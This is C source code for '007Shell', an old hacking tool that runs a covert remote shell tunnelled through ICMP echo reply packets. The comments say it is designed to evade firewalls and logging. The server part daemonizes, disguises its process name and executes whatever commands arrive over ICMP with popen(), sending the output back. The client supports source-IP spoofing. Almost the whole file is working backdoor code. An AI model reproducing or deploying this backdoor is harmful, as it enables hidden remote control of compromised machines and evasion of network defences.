/*
 * 007Shell.c	v.1.0		Covert Shell Tunnelling in ICMP 0x00 ECHO
 *				REPLY message types. Works by putting
 *				data streams in the ICMP message past the  
 *				usual 4 bytes (8-bit type, 8-bit code and
 *				16-bit checksum).
 *				Please note that is also possible to use
 *				0x08 ECHO or 0x0D TIMESTAMPREPLY. And ICMP 
 *				is not the only protocol in which we can
 *				tunnel data.
 *				It simply is so common to let ICMP ECHO
 *				REPLY slip through firewalls and not to
 *				log it.
 *
 * Thanks and ShoutOuts:
 *			      -	For further infos check the LOKI project
 *				by Daemon9. Hey, seems really that r00t
 *				owns us all :)
 *
 * Compile with:		make  ( Life is nice, eh ?! ;P )
 *
 *				NO(C)1998 FuSyS
 */

#include <stdio.h>
#include <unistd.h>
#include "ICMPLIB_V1.h"

#define YEAH		1
#define NOPE		0
#define BUFFSIZE	512
#define OFFLINE		"snafuz!"
#define ROOTDIR		"/tmp"

void usage(char *code)
{
	fprintf(stderr,"\n\033[1;34mUsage:\033[0m \033[0;32m%s \033[0m\033[1;34m-s|-c [-h host] [-S spoofed_source_IP]\033[0m\n\n", code);
        exit(0);
}


int main(int argc, char **argv)
{
	char data[MAXMESG] ;
	char recvdata[MAXMESG+BUFFSIZE] ;
	char senddata[MAXMESG+BUFFSIZE] ;
	
	int opt, off = 0, n, i ;
	int srvr = 0, clnt = 0 ;
	int pid, ret ;
	u_long hostaddress, cliaddress ;
	char buf[BUFFSIZE] ;
	char buf2[BUFFSIZE] ;

	FILE *job ;

	if (argc < 2) usage(argv[0]);

	while ((opt = getopt(argc, argv, "sch:S:")) != EOF) {
		switch(opt)
		{
			case 's':
			  srvr++;
			  break;

			case 'c':
			  clnt++;
			  break;

			case 'h':
			  hostaddress = nameResolve(optarg);
			  break;

			case 'S':
			  ip_spoof = YEAH;
			  spoof_addr = nameResolve(optarg);
			  break;

			default:
			  usage(argv[0]);
		}
	}

	if (srvr)
	strcpy(argv[0], "007Shell v.1.0 - Good Luck James ...");

	if (!hostaddress && clnt) {
		fprintf(stderr, "\n\033[0;5;31mYou must specify the server address\033[0m\n\n");
		exit(0);
	}

	if (clnt && !srvr) {

	   printf("\033[0;32m007Shell v.1.0 - Let's Dig Covert !\033[m\n");

	   while (!ferror(stdin) && !feof(stdin)) {
		bzero(senddata, sizeof(senddata));
		bzero(recvdata, sizeof(recvdata));
		
		printf("\033[0;32m[covert@007Shell]# \033[0m");

	      	if (fgets(data, MAXMESG, stdin) == NULL)
			break;

		data[strlen(data)-1] = 0;

    		if(strstr(data, OFFLINE)) off = 1 ;

		strcat(senddata, data);

	      if(ip_spoof == NOPE) {
	   	if( ICMP_send(senddata, strlen(senddata), hostaddress, 0, 0) < 0) {
			perror("\033[0;5;31mTunnel_Send: \033[0m");
			exit(0);
	   	}
	      
	   	if (off && clnt) {
			ICMP_reset();
			printf("\033[0;32mSee ya Covert, James ...\033[0m\n");
			exit(0);
		}

		while(1) {
		   memset(recvdata, '\0', strlen(recvdata));
 		   if((n=ICMP_recv(recvdata, MAXMESG, REPLY)) != -666) { 
	   		printf("%s", recvdata);
		   } else break;
		}
	     }
	     if(ip_spoof == YEAH) {
		if( ICMP_sp_send(senddata, strlen(senddata), hostaddress,
			spoof_addr) < 0) {
			perror("\033[0;5;31mTunnel_Send: \033[0m");
                	exit(0);
                }
		if (off && clnt) {
                        ICMP_reset();
                        printf("\033[0;32mSee ya Covert, James ...\033[0m\n");
                        exit(0);
                }		 
	     }
	   }
	}
	 
	else if(srvr && !clnt) {
	   	pid = fork();
	   	if (pid != 0) {
			printf("\033[0;32m007Shell v.1.0 - Let's Go Covert !\033[0m\n");
			exit(0);
		}

	   	setsid();
	   	chdir(ROOTDIR);
	   	umask(0);
	  	
	  while(!off) {
		ret = 0;
		bzero(senddata, sizeof(senddata));
                bzero(recvdata, sizeof(recvdata));

	  	if((n=ICMP_recv(recvdata, MAXMESG, 0)) < 0) {
			perror("\033[0;5;31mTunnel_Recv: \033[0m");
			exit(0);
		}
		cliaddress = clisrc.sin_addr.s_addr;
	
		if(strstr(recvdata, OFFLINE)) {
			ICMP_reset();
			exit(0);
		}
		if (!(job = popen(recvdata, "r"))) {
	                perror("\033[0;5;31Popen: \033[0m");
                        exit(0);
                }
		while(fgets(buf, BUFFSIZE-1, job)) {
			ret++;
			bcopy(buf, buf2, BUFFSIZE);
			ICMP_send(buf2, strlen(buf2), cliaddress, REPLY, 0);
	   	}
			ICMP_send("", 0, cliaddress, 0, LAST);
		pclose(job);
		fflush(NULL);
	   }
    	}

	ICMP_reset();
	exit(1);
}
